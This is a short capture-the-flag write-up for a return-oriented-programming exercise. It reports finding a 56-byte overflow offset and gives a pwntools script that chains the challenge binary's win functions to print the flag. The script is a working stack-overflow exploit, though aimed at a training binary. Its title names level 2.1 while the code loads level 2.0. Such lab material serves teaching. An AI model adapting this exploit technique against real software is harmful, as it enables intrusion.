# Return Oriented Programming 2.1

Similar to level 2.0, however the file didn't provide us with the offset. Using De'Bruijn sequence, we found that the offset is 56.

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyrop_level2.0")

io = process()

print("===== STARTING EXPLOIT =====")

offset = 56

rop = ROP(elf)
rop.raw(b'A' * offset)
rop.win_stage_1()
rop.win_stage_2()

io.sendline(rop.chain())

io.recvuntil(b'Leaving!\n')
print(f'Flag: {io.recvline(False)}')
```
